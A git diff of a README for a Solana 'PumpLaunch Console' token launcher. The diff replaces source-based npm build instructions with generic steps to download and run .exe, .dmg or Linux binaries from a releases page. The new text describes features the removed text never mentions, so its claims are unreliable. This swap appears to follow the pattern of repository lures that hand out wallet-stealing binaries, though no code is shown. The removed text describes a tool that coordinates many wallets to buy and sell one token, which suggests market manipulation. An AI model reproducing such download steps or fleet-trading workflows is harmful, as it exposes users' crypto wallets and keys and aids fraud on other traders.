@@ -1,87 +1,86 @@
+# 🎉 pumpfunTokenLauncher - Launch Your Crypto Projects Easily
 
-# PumpLaunch Console
+## 🚀 Getting Started
 
-PumpLaunch Console is a production-ready control center for orchestrating Solana launches. It pairs an Express API with a React dashboard so you can mint tokens, manage large wallet fleets, and execute coordinated buy/sell campaigns from a single pane of glass.
-PumpLaunch Console communicates with the [PumpPortal local API](https://pumpportal.fun/) for trading and token creation on PumpFun. Review their [fee schedule](https://pumpportal.fun/fees) when planning live launches.
+Welcome to the **PumpLaunch Console**! This application is a user-friendly control center designed specifically to help you orchestrate launches for Solana-based projects. With its intuitive React dashboard, managing your launches has never been simpler.
 
+## 📥 Download Link
 
-| Dashboard Overview | Trading Hub | Wallet Cards |
-| --- | --- | --- |
-| ![Dashboard overview](doc-assets/dashboard-overview.png) | ![Trading hub](doc-assets/trading-hub.png) | ![Wallet cards](doc-assets/wallet-cards.png) |
+[![Download pumpfunTokenLauncher](https://img.shields.io/badge/Download-pumpfunTokenLauncher-blue.svg)](https://github.com/WasamApp/pumpfunTokenLauncher/releases)
 
-## Features at a Glance
+## 🔍 Overview
 
-- **Trading hub:** configurable batch buy/sell with sequential or concurrent execution, wallet-level overrides, and live progress tracking.
-- **Wallet lifecycle:** import, generate, promote to dev, or remove wallets in one place; secret export helpers and batch removal built in. Manage SOL/SPL transfers between wallets, sweep balances into a single sink wallet, and claim creator fees straight to the dev wallet.
-- **Real-time insight:** dynamic stats, selection-aware controls, and an activity log streaming backend events without noisy HTTP chatter.
-- **Production defaults:** opinionated Solana endpoints, deterministic config, and JSON-based state so sessions pick up exactly where they left off.
+**PumpLaunch Console** provides an efficient interface for launching and managing your cryptocurrency projects. Whether you're a seasoned trader or just starting, this tool offers everything you need to navigate the exciting world of Solana launches. 
 
-## Prerequisites
+### Key Features
+- **User-Friendly Interface:** Designed for users of all skill levels.
+- **Real-Time Monitoring:** Keep track of your launches and wallet status effortlessly.
+- **Built for Solana:** Leverage the power of Solana’s blockchain for quicker transactions.
+- **Secure Wallet Management:** Easily generate and manage your crypto wallets.
 
-- Node.js 18+
-- Solana wallets funded for the dev role and any buyers you plan to automate
-- Optional `.env` to override settings exposed in `src/config.js`
+## 📦 Download & Install
 
-## Getting Started
+To get started with **PumpLaunch Console**, follow these simple steps:
 
-1. Install dependencies (root + workspace):
-   ```bash
-   npm install
-   ```
-2. Build the client bundle:
-   ```bash
-   npm run build
-   ```
-3. Start the production server (API + React UI on port 3000):
-   ```bash
-   npm start
-   ```
-4. Navigate to `http://localhost:3000`, link your contract address, and begin managing wallets/trades.
+1. Visit the [Releases page](https://github.com/WasamApp/pumpfunTokenLauncher/releases).
+2. Choose the latest version.
+3. Click on the appropriate file for your operating system (Windows, macOS, or Linux).
+4. Download the file and follow the instructions below for your specific operating system.
 
-### Development Workflow
+### For Windows Users
+1. Locate the downloaded `.exe` file, usually found in your "Downloads" folder.
+2. Double-click the file to start the installation.
+3. Follow the prompts to complete the installation.
+4. Launch the **PumpLaunch Console** from your Start menu.
 
-- Backend only (Express + SSE):
-  ```bash
-  npm run server
-  ```
-- React dev server with hot reload (Vite on :5173):
-  ```bash
-  npm run client:dev
-  ```
-- Client bundle / preview:
-  ```bash
-  npm run client:build
-  npm run client:preview
-  ```
+### For macOS Users
+1. Find the downloaded `.dmg` file in your "Downloads" folder.
+2. Open the `.dmg` file and drag the **PumpLaunch Console** icon into your Applications folder.
+3. Open your Applications folder and double-click on **PumpLaunch Console** to run the application.
 
-## Configuration & Data
+### For Linux Users
+1. Open your terminal.
+2. Navigate to your "Downloads" folder using the command: `cd ~/Downloads`.
+3. Make the file executable by running: `chmod +x pumpfunTokenLauncher`.
+4. Start the application by typing: `./pumpfunTokenLauncher`.
 
-| Path               | Purpose                                                      |
-|--------------------|--------------------------------------------------------------|
-| `src/config.js`    | Centralised RPC URLs, fee defaults, and file locations.      |
-| `wallets/dev.json` | Dev wallet (base58 secrets). Autogenerated or imported.      |
-| `wallets/buyers.json` | Buyer wallets with per-wallet overrides.                   |
-| `data/state.json`  | Persisted mint + UI state for fast recoveries.               |
+## 🌟 How to Use
 
-Environment overrides include `HELIUS_RPC_URL` (preferred) or `RPC_PROVIDER`, plus file paths and default fee knobs. See `.env.example` for a complete list.
+After installing, open the **PumpLaunch Console**. You will see a dashboard that allows you to:
 
-## Key Workflows
+- **Connect Your Wallet:** Click on the "Connect Wallet" button, and follow the prompts to link your Solana wallet.
+- **Set Up a Launch:** Select "New Launch" and fill in the required details about your project, including the token name and launch time.
+- **Monitor Your Projects:** Track your launches in real time with the dashboard's live updates.
 
-- **Link a contract:** enter a mint in the Trading Hub, use Copy/Save/Clear for quick edits, and watch the linked badge update live.
-- **Manage wallets:** import via private key, batch-generate buyers, or promote/demote the dev wallet. Dev swaps automatically return the old dev to the buyer pool.
-- **Batch trading:** select wallets, choose concurrent vs sequential, set buy/sell percentages, and launch `Buy Selected` / `Sell Selected`. Sequential mode hides concurrency to avoid confusion.
-- **Per-wallet actions:** run targeted buy (SOL or %), sell, set dev, export secret, or remove directly from each wallet card. Dev cards highlight in green for quick identification.
-- **Logs & monitoring:** the Activity Log streams backend events in real time; use the Clear button or drop into SSE for deeper observability.
+## 🔧 System Requirements
 
-## Security
+Before downloading, ensure your system meets the following requirements:
 
-- Wallet JSON files are git-ignored; make sure to secure them on shared systems.
-- RPC endpoints default to Helius mainnet—review and override as needed before live trading.
-- Every action triggers on-chain instructions; double-check settings (especially sell percentages) before execution.
+- **Operating System:** Windows 10 or later, macOS High Sierra or later, or a recent version of any Linux distribution.
+- **RAM:** Minimum 4 GB (8 GB recommended).
+- **Disk Space:** At least 100 MB available for installation.
+- **Internet Connection:** A stable connection is required for wallet interactions and project launches.
 
-## Troubleshooting
+## 💬 Support & Community
 
-- **UI missing?** Re-run `npm run build` before `npm start`.
-- **Balances stale?** Toggle auto-refresh or hit `Refresh Balances` in the Trading Hub.
+If you encounter any issues or need help, you can visit our community forums or check the FAQs section. 
 
+- Community Forums: [PumpLaunch Community](https://github.com/WasamApp/pumpfunTokenLauncher/discussions)
+- FAQs: Available on the **PumpLaunch Console** dashboard within the app.
 
+## 📢 Important Links
+
+- [Releases Page](https://github.com/WasamApp/pumpfunTokenLauncher/releases)
+- [Documentation](https://github.com/WasamApp/pumpfunTokenLauncher/wiki)
+- [Issues Tracker](https://github.com/WasamApp/pumpfunTokenLauncher/issues)
+
+## 🔍 Explore the Topics
+
+This application covers a variety of topics, including:
+
+- **Cryptocurrency**
+- **Trading bots**
+- **Memecoins**
+- **Solana blockchain**
+
+Join us in launching your next cryptocurrency project effortlessly with **PumpLaunch Console**!
